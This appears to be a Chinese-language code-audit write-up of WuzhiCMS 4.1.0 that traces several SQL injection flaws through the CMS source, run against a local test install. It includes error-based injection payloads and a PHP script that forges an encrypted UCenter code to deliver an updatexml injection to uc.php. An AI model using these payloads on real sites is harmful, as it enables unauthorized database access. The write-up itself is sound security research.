+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">/www/index.php?m=core&amp;f=copyfrom&amp;v=listing&amp;_su=wuzhicms&amp;_menuid=54&amp;_submenuid=54&amp;keywords=&#x27;<br></code></pre></td></tr></table></figure>
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752910689328-3525c9e5-f012-4fe1-986d-3b1bbd9123e6.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<h5 id="3-1-1-2-原因分析-代码跟进"><a href="#3-1-1-2-原因分析-代码跟进" class="headerlink" title="3.1.1.2 原因分析&amp;代码跟进"></a>3.1.1.2 原因分析&amp;代码跟进</h5><p>路由对应的是 coreframe&#x2F;app&#x2F;core&#x2F;admin&#x2F;copyfrom.php 文件 listing()方法</p>
+<p>该方法将全局接收的 keywords 参数直接作为参数，传入 db 对象调用的 get_list()中执行。db 是 copyfrom 类的构造器执行 load_file()实例化 db.class.php 文件中的 WUZHI_db 类对象</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function listing() &#123;<br>        $siteid = get_cookie(&#x27;siteid&#x27;);<br>        $page = isset($GLOBALS[&#x27;page&#x27;]) ? intval($GLOBALS[&#x27;page&#x27;]) : 1;<br>        $page = max($page,1);<br>        if(isset($GLOBALS[&#x27;keywords&#x27;])) &#123;<br>            $keywords = $GLOBALS[&#x27;keywords&#x27;];<br>            $where = &quot;`name` LIKE &#x27;%$keywords%&#x27;&quot;;<br>        &#125; else &#123;<br>            $where = &#x27;&#x27;;<br>        &#125;<br>		$result = $this-&gt;db-&gt;get_list(&#x27;copyfrom&#x27;, $where, &#x27;*&#x27;, 0, 20,$page);<br>		$pages = $this-&gt;db-&gt;pages;<br>        $total = $this-&gt;db-&gt;number;<br>		include $this-&gt;template(&#x27;copyfrom_listing&#x27;);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以跟进到 db.class.php 文件(写了 WUZHI_DB 类）中的 get_list()又将$where 传入 array2sql（）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">final public function get_list($table, $where = &#x27;&#x27;, $field = &#x27;*&#x27;, $startid = 0, $pagesize = 200, $page = 0, $order = &#x27;&#x27;, $group = &#x27;&#x27;, $keyfield = &#x27;&#x27;, $urlrule = &#x27;&#x27;,$array = array(),$colspan = 10) &#123;<br>	$where = $this-&gt;array2sql($where);<br>   .......<br></code></pre></td></tr></table></figure>
+
+<p>array2sql 对$where 进行安全处理，但不严谨</p>
+<p>传入的参数只<strong>有是数组的时候才会进行处理去除%20 %27 ( ) ‘</strong></p>
+<p>否则只去除%20 %27</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs plain">private function array2sql($data) &#123;<br>	if(empty($data)) return &#x27;&#x27;;<br>	if(is_array($data)) &#123;<br>		$sql = &#x27;&#x27;;<br>		foreach ($data as $key =&gt; $val) &#123;<br>			$val = str_replace(&quot;%20&quot;, &#x27;&#x27;, $val);<br>			$val = str_replace(&quot;%27&quot;, &#x27;&#x27;, $val);<br>			$val = str_replace(&quot;(&quot;, &#x27;&#x27;, $val);<br>			$val = str_replace(&quot;)&quot;, &#x27;&#x27;, $val);<br>			$val = str_replace(&quot;&#x27;&quot;, &#x27;&#x27;, $val);<br>			$sql .= $sql ? &quot; AND `$key` = &#x27;$val&#x27; &quot; : &quot; `$key` = &#x27;$val&#x27; &quot;;<br>		&#125;<br>		return $sql;<br>	&#125; else &#123;<br>		$data = str_replace(&quot;%20&quot;, &#x27;&#x27;, $data);<br>		$data = str_replace(&quot;%27&quot;, &#x27;&#x27;, $data);<br>		return $data;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在 payload 中写%27,发现做安全处理时%27 是以’出现的，（后端接收是已经自动解码了）</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752996458707-1776935c-7494-4461-9cfd-0492899389b0.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<p>将返回结果赋值给$where，接下来回到我们的 get_list 方法接着执行，调试一下跟着进去 count_result() —&gt;count()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">final public function get_list($table, $where = &#x27;&#x27;, $field = &#x27;*&#x27;, $startid = 0, $pagesize = 200, $page = 0, $order = &#x27;&#x27;, $group = &#x27;&#x27;, $keyfield = &#x27;&#x27;, $urlrule = &#x27;&#x27;,$array = array(),$colspan = 10) &#123;<br>	$where = $this-&gt;array2sql($where);<br>	$offset = 0;<br>	$page = max(intval($page), 1);<br>	$offset = $pagesize*($page-1)+$startid;<br>	if($page) &#123;<br>		$this-&gt;number = $this-&gt;count_result($table,$where);<br>		$this-&gt;pages = pages($this-&gt;number, $page, $pagesize, $urlrule, $array,$colspan);<br>	&#125;<br>	if ($page &amp;&amp; $this-&gt;number == 0) &#123;<br>		return array();<br>	&#125; else &#123;<br>		return $this-&gt;read_db-&gt;get_list($table, $where, $field, &quot;$offset,$pagesize&quot;, $order, $group, $keyfield);<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>又出现了 array2sql 再一次进行安全处理(虽然并不严谨嘞)，之后 read_db-&gt;get_one 走到了 coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;mysqli.class.php 的 get_one 方法(read_db 在 WUZHI_DB 的构造器里有定义是 WUZHI_mysqli 实例化对象)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">final public function count($table, $where = &#x27;&#x27;, $field = &quot;COUNT(*) AS num&quot;, $startid = 0, $order = &#x27;&#x27;, $group = &#x27;&#x27;) &#123;<br>    $where = $this-&gt;array2sql($where);<br>    return $this-&gt;read_db-&gt;get_one($table, $where, $field, &quot;$startid,1&quot;, $order, $group, FALSE);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>mysqli.class.php ：get_one()直接将$where 拼接到 sql 语句中 query()执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function get_one($table, $where, $field = &#x27;*&#x27;, $limit = &#x27;&#x27;, $order = &#x27;&#x27;, $group = &#x27;&#x27;, $condition = TRUE) &#123;<br>    $where = $where ? &#x27; WHERE &#x27;.$where: &#x27;&#x27;;<br>    if($condition) &#123;<br>       $field = $field == &#x27;*&#x27; ? &#x27;*&#x27; : self::safe_filed($field);<br>    &#125; else &#123;<br>       $field = $this-&gt;escape_string($field);<br>    &#125;<br>    $order = $order ? &#x27; ORDER BY &#x27;.$order : &#x27;&#x27;;<br>    $group = $group ? &#x27; GROUP BY &#x27;.$group : &#x27;&#x27;;<br>    $limit = $limit ? &#x27; LIMIT &#x27;.$limit : &#x27;&#x27;;<br><br>    $sql = &#x27;SELECT &#x27;.$field.&#x27; FROM `&#x27;.$this-&gt;tablepre.$table.&#x27;`&#x27;.$where.$group.$order.$limit;<br>    $query = $this-&gt;query($sql);<br>    return $this-&gt;fetch_array($query);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>query 是自定义的,在它里面调 halt()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function query($sql, $type = &#x27;&#x27;, $cachetime = FALSE) &#123;<br>       //if($_SERVER[&#x27;REMOTE_ADDR&#x27;]==&#x27;127.0.0.1&#x27;) echo $sql.&quot;&lt;br&gt;&quot;;<br>    if(!($query = mysqli_query($this-&gt;link,$sql)) &amp;&amp; $type != &#x27;SILENT&#x27;) &#123;<br>       $this-&gt;halt(&#x27;MySQL Query Error&#x27;, $sql);<br>    &#125;<br>    $this-&gt;querynum++;<br>    $this-&gt;histories[] = $sql;<br>    if(defined(&#x27;SQL_LOG&#x27;) &amp;&amp; SQL_LOG==&#x27;1&#x27;) &#123;<br>       if(substr($sql,0,21)!=&#x27;INSERT INTO `wz_logs`&#x27; &amp;&amp;  substr($sql,0,24)!=&#x27;DELETE FROM `wz_session`&#x27; &amp;&amp; substr($sql,0,25)!=&#x27;REPLACE INTO `wz_session`&#x27;) &#123;<br>          error_log(date(&#x27;Y-m-d H:i:s&#x27;,SYS_TIME).&#x27; &#x27;.$sql.&quot;\r\n&quot;, 3, CACHE_ROOT.&quot;sql_log.&quot;.CACHE_EXT.&#x27;.sql&#x27;);<br>       &#125;<br>    &#125;<br>    return $query;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>halt  将错误信息、SQL 语句和 MySQL 错误内容一起输出，所以可以用报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function halt($message = &#x27;&#x27;, $sql = &#x27;&#x27;) &#123;<br>       MSG(&#x27;&lt;div style=&quot;font-size: 9px;word-break: break-all;height: 150px;overflow: overlay;&quot;&gt;[sql_error]&#x27;.$message.&#x27;<br><br>&#x27;.$sql.&#x27;<br>[msg]&#x27;.mysqli_error($this-&gt;link).&#x27;&lt;/div&gt;&#x27;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="3-1-2-注入-二-同-一"><a href="#3-1-2-注入-二-同-一" class="headerlink" title="3.1.2 注入(二)同(一)"></a>3.1.2 注入(二)同(一)</h4><p>发现网站还是有很多的搜索的，既然 array2sql()的安全处理有问题，后面也给报错注入提供了机会，接下来全局搜索 get_list 方法</p>
+<p>找第二个参数不是数组的，且是可控变量</p>
+<p>coreframe&#x2F;app&#x2F;order&#x2F;admin&#x2F;card.php</p>
+<p>对应的路由就是&#x2F;www&#x2F;index.php?m&#x3D;order&amp;f&#x3D;card&amp;v&#x3D;listing&amp;_su&#x3D;wuzhicms</p>
+<h5 id="3-1-2-1-构造-payload"><a href="#3-1-2-1-构造-payload" class="headerlink" title="3.1.2.1 构造 payload"></a>3.1.2.1 构造 payload</h5><p>接着根据源码构造 payload,这里和 sql 注入(一）都是利用 get_list()接受的第二个参数不是数组来绕过较完善的安全处理，<strong>不太一样的就是参数 key_type 要改成非 0，非 1</strong>的跳过 if,直接 get_list</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function listing() &#123;<br>       $page = isset($GLOBALS[&#x27;page&#x27;]) ? intval($GLOBALS[&#x27;page&#x27;]) : 1;<br>       $page = max($page,1);<br>       $batchid = isset($GLOBALS[&#x27;batchid&#x27;]) ? $GLOBALS[&#x27;batchid&#x27;] : 0;<br>       $keytype = isset($GLOBALS[&#x27;keytype&#x27;]) ? $GLOBALS[&#x27;keytype&#x27;] : 0;<br>       $keywords = isset($GLOBALS[&#x27;keywords&#x27;]) ? trim($GLOBALS[&#x27;keywords&#x27;]) : &#x27;&#x27;;<br><br>       $where = $batchid ? &quot;`batchid`=&#x27;$batchid&#x27;&quot; : &#x27;&#x27;;<br>       if($keytype==0 &amp;&amp; $keywords) &#123;<br>           $where = &quot;card_no LIKE &#x27;$keywords%&#x27;&quot;;<br>       &#125; elseif($keytype==1 &amp;&amp; $keywords) &#123;<br>           $r = $this-&gt;db-&gt;get_one(&#x27;member&#x27;, array(&#x27;username&#x27; =&gt; $keywords));<br>           if($r) &#123;<br>               $uid = $r[&#x27;uid&#x27;];<br>               $where = &quot;uid = &#x27;$uid&#x27;&quot;;<br>           &#125; else &#123;<br>               MSG(&#x27;用户不存在&#x27;,HTTP_REFERER);<br>           &#125;<br>       &#125;<br>       $result = $this-&gt;db-&gt;get_list(&#x27;order_card&#x27;, $where, &#x27;*&#x27;, 0, 20,$page,&#x27;cardid DESC&#x27;);<br>       $pages = $this-&gt;db-&gt;pages;<br>       $total = $this-&gt;db-&gt;number;<br>       $status_arr = array(&#x27;&lt;b&gt;待发送&lt;/b&gt;&#x27;,&#x27;未预约&#x27;,&#x27;已预约&#x27;);<br>       include $this-&gt;template(&#x27;card_listing&#x27;);<br>   &#125;<br><br></code></pre></td></tr></table></figure>
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752923334324-c1d6d104-6d86-4344-bdff-1732c8a59418.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<h4 id><a href="#" class="headerlink" title></a></h4><hr>
+<p>还找到一个</p>
+<p>coreframe&#x2F;app&#x2F;promote&#x2F;admin&#x2F;index.php search()方法</p>
+<p>和(一)一模一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function search() &#123;<br>       $siteid = get_cookie(&#x27;siteid&#x27;);<br>       $page = isset($GLOBALS[&#x27;page&#x27;]) ? intval($GLOBALS[&#x27;page&#x27;]) : 1;<br>       $page = max($page,1);<br>       $fieldtype = $GLOBALS[&#x27;fieldtype&#x27;];<br>       $keywords = $GLOBALS[&#x27;keywords&#x27;];<br>       if($fieldtype==&#x27;place&#x27;) &#123;<br>           $where = &quot;`siteid`=&#x27;$siteid&#x27; AND `name` LIKE &#x27;%$keywords%&#x27;&quot;;<br>           $result = $this-&gt;db-&gt;get_list(&#x27;promote_place&#x27;, $where, &#x27;*&#x27;, 0, 50,$page,&#x27;pid ASC&#x27;);<br>           .......<br></code></pre></td></tr></table></figure>
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752925927586-14d52fb8-fd2d-4d21-9c20-7d9d4b9ed64b.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<p>同理的再+1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function detail_listing() &#123;<br>    $page = isset($GLOBALS[&#x27;page&#x27;]) ? intval($GLOBALS[&#x27;page&#x27;]) : 1;<br>    $page = max($page,1);<br>    $groupname = isset($GLOBALS[&#x27;groupname&#x27;]) ? strip_tags($GLOBALS[&#x27;groupname&#x27;]) : &#x27;&#x27;;<br>    $where = $groupname ? &quot;groupname=&#x27;$groupname&#x27;&quot; : &#x27;&#x27;;<br>    $result = $this-&gt;db-&gt;get_list(&#x27;coupon_card&#x27;, $where, &#x27;*&#x27;, 0, 20,$page,&#x27;cardid DESC&#x27;);<br>    $pages = $this-&gt;db-&gt;pages;<br>    $t<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><font style="color:rgba(0, 0, 0, 0.85);">在 PHP 中，</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.85);&quot;&gt;strip_tags()&lt;/font&gt;</code><font style="color:rgba(0, 0, 0, 0.85);"> 是一个内置函数，用于从字符串中移除 HTML 和 PHP 标签。它通常用于过滤用户输入，防止 XSS 攻击或净化文本内容</font></p>
+</blockquote>
+<p>这里对应的功能点是要生成一个优惠劵，在优惠卷列表这里</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752999188658-3312cd25-620e-4857-aebf-cca88dde9a03.png" srcset="/img/loading.gif" lazyload style="zoom:33%;">
+
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1752999682295-08b8c1e9-f795-4604-87de-f64c0e13b28a.png" srcset="/img/loading.gif" lazyload style="zoom:50%;">
+
+<hr>
+<p>在搜索的过程中发现</p>
+<p>\phpstudy_pro\WWW\wuzhicms-4.1.0\www\api\uc.php 但是访问这个接口返回 Invalid Request，在后面参考文章知道也是可以利用的</p>
+<p>注意是双引号闭合的哈！！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">function synlogin($get, $post) &#123;<br>    header(&#x27;P3P: CP=&quot;CURa ADMa DEVa PSAo PSDo OUR BUS UNI PUR INT DEM STA PRE COM NAV OTC NOI DSP COR&quot;&#x27;);<br>    $username = $get[&#x27;username&#x27;];<br>    $r = $this-&gt;member-&gt;db-&gt;get_one(&#x27;member&#x27;, &#x27;username=&quot;&#x27;.$username.&#x27;&quot;&#x27;);<br>    print_r($r);<br>    if($r)&#123;<br>       $cookietime = COOKIE_TTL ? SYS_TIME.COOKIE_TTL : 0;<br>       set_cookie(&#x27;auth&#x27;, encode($r[&#x27;uid&#x27;].&quot;\t&quot;.$r[&#x27;password&#x27;].&quot;\t&quot;.$cookietime, substr(md5(_KEY), 8, 8)), $cookietime);<br>       set_cookie(&#x27;_uid&#x27;, $r[&#x27;uid&#x27;], $cookietime);<br>       set_cookie(&#x27;_username&#x27;, $r[&#x27;username&#x27;], $cookietime);<br>       set_cookie(&#x27;_groupid&#x27;, $r[&#x27;groupid&#x27;], $cookietime);<br>    &#125;<br>    return API_RETURN_SUCCEED;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>返回 Invalid Request 因为：</p>
+<ul>
+<li>这个接口是专门为 UCenter（用户中心）服务端通信设计的，不是给普通用户或浏览器访问的页面。</li>
+<li>它需要一个经过加密的 code 参数，只有 UCenter 系统才能正确生成。</li>
+</ul>
+<p>调试拿到自己的 key</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753001686474-e8aaceaf-89ef-4893-bb08-d8ddbc4fa520.png" srcset="/img/loading.gif" lazyload style="zoom:33%;">
+
+<p>将用 ai 写的脚本放在根目录下访问，得到输出的 Code</p>
+<p>payload 构造：’username’ &#x3D;&gt; ‘1111” and updatexml(1,concat(0x7e,database()),1) – ‘</p>
+<blockquote>
+<p>注意 “ 闭合，–空格 才能起到注释作用，–+会使得本身语法报错，就不会触发 updatexml 报错了</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php<br>function _authcode($string, $operation = &#x27;DECODE&#x27;, $key = &#x27;&#x27;, $expiry = 0) &#123;<br>    $ckey_length = 4;<br>    $key = md5($key ? $key : &#x27;123456&#x27;); // 这里填你的UC_KEY<br>    $keya = md5(substr($key, 0, 16));<br>    $keyb = md5(substr($key, 16, 16));<br>    $keyc = $ckey_length ? ($operation == &#x27;DECODE&#x27; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &#x27;&#x27;;<br>    $cryptkey = $keya.md5($keya.$keyc);<br>    $key_length = strlen($cryptkey);<br>    $string = $operation == &#x27;DECODE&#x27; ? base64_decode(substr($string, $ckey_length)) : sprintf(&#x27;%010d&#x27;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;<br>    $string_length = strlen($string);<br>    $result = &#x27;&#x27;;<br>    $box = range(0, 255);<br>    $rndkey = array();<br>    for($i = 0; $i &lt;= 255; $i++) &#123;<br>        $rndkey[$i] = ord($cryptkey[$i % $key_length]);<br>    &#125;<br>    for($j = $i = 0; $i &lt; 256; $i++) &#123;<br>        $j = ($j + $box[$i] + $rndkey[$i]) % 256;<br>        $tmp = $box[$i];<br>        $box[$i] = $box[$j];<br>        $box[$j] = $tmp;<br>    &#125;<br>    for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;<br>        $a = ($a + 1) % 256;<br>        $j = ($j + $box[$a]) % 256;<br>        $tmp = $box[$a];<br>        $box[$a] = $box[$j];<br>        $box[$j] = $tmp;<br>        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));<br>    &#125;<br>    if($operation == &#x27;DECODE&#x27;) &#123;<br>        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;<br>            return substr($result, 26);<br>        &#125; else &#123;<br>            return &#x27;&#x27;;<br>        &#125;<br>    &#125; else &#123;<br>        return $keyc.str_replace(&#x27;=&#x27;, &#x27;&#x27;, base64_encode($result));<br>    &#125;<br>&#125;<br><br>// 1. 构造参数<br>$data = array(<br>    &#x27;action&#x27; =&gt; &#x27;synlogin&#x27;,<br>    &#x27;username&#x27; =&gt; &#x27;1111&quot; and updatexml(1,concat(0x7e,database()),1) -- &#x27;, // 替换成你要测试的用户名<br>    &#x27;time&#x27; =&gt; time()<br>);<br><br>// 2. 拼接参数为字符串<br>$query = http_build_query($data);<br><br>// 3. 加密<br>$uc_key = &#x27;e063rbkHX22RAvIg&#x27;; // 这里填你的UC_KEY<br>$code = _authcode($query, &#x27;ENCODE&#x27;, $uc_key);<br><br>// 4. 输出测试URL<br>echo &quot;http://wuzhicms:8126/www/api/uc.php?code=&quot; . urlencode($code);<br></code></pre></td></tr></table></figure>
+
+<p>加上 code 再访问就成功了</p>
+<p>wuzhicms:8126&#x2F;www&#x2F;api&#x2F;uc.php?code&#x3D;9675YErSfI7%2FTSjfF96QJIXD289WM2BGZBb7hojSXsjZWrO5ZtPqStiDPp1oKaysw73e5MKbfBZxZRfYTzas%2Bu0L8zGkY1RNCIjUGyMJ0fb7TqisICD7G28M86WkntsZ04%2FIpGJk9LbVT0jyyVFszXtKVYMNZIpjl%2BJ8S7O5JK4UzDiOkY%2FCjdhqdxaDXA</p>
+<img src="https://typor-imagesbx.oss-cn-beijing.aliyuncs.com/1753010666455-d39ba572-75f5-4cc3-852d-d67ed7b39f81.png" srcset="/img/loading.gif" lazyload style="zoom: 50%;">
+
+<h4 id="3-1-3-注入-三"><a href="#3-1-3-注入-三" class="headerlink" title="3.1.3 注入(三)"></a>3.1.3 注入(三)</h4><h5 id="3-1-3-1-从可控参数开始"><a href="#3-1-3-1-从可控参数开始" class="headerlink" title="3.1.3.1 从可控参数开始"></a>3.1.3.1 从可控参数开始</h5><p>以上是从一个功能点找到的，分析对应代码找到一个危险方法进而找到的。接着从可控参数入手且需要能与数据库进行交互的，搜索$GLOBALS</p>
+<p>coreframe&#x2F;app&#x2F;member&#x2F;admin&#x2F;group.php 的 del 方法，db-&gt;delete()跟进到 coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;db.class.php 文件（db 是 load_class 加载的）</p>
+<p>并且这里是以<strong>数组</strong>的形式传递的，那么安全处理时就全处理了（但）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">public function del() &#123;<br>	if(isset($GLOBALS[&#x27;groupid&#x27;]) &amp;&amp; $GLOBALS[&#x27;groupid&#x27;]) &#123;<br>		if(is_array($GLOBALS[&#x27;groupid&#x27;])) &#123;<br>			$where = &#x27; IN (&#x27;.implode(&#x27;,&#x27;, $GLOBALS[&#x27;groupid&#x27;]).&#x27;)&#x27;;<br>			foreach($GLOBALS[&#x27;groupid&#x27;] as $gid) &#123;<br>				$this-&gt;db-&gt;delete(&#x27;member_group_priv&#x27;, array(&#x27;groupid&#x27; =&gt; $gid));<br>			&#125;<br>		&#125; else &#123;<br>			$where = &#x27; = &#x27;.$GLOBALS[&#x27;groupid&#x27;];<br>			$this-&gt;db-&gt;delete(&#x27;member_group_priv&#x27;, array(&#x27;groupid&#x27; =&gt; $GLOBALS[&#x27;groupid&#x27;]));<br>		&#125;<br><br>		$this-&gt;db-&gt;delete(&#x27;member_group&#x27;, &#x27;issystem != 1 AND groupid&#x27;.$where);<br>		$this-&gt;group-&gt;set_cache();<br><br></code></pre></td></tr></table></figure>
+
+<p>db.class.php：</p>
+<p>master_db-&gt;delete($table, $where)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">final public function delete($table, $where = &#x27;&#x27;) &#123;<br>    $where = $this-&gt;array2sql($where);<br>    return $this-&gt;master_db-&gt;delete($table, $where);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在构造器里找到 master_db 是 WUZHI_musqli 实例化对象（文件路径为：coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;class&#x2F;mysqli.class.php）</p>
+<ul>
+<li>get_config()方法是在 core.php 文件中去定义的,因为入口文件会加载 coreframe&#x2F;core.php,该方法返回配置文件 mysql_config.php 内容</li>
+</ul>
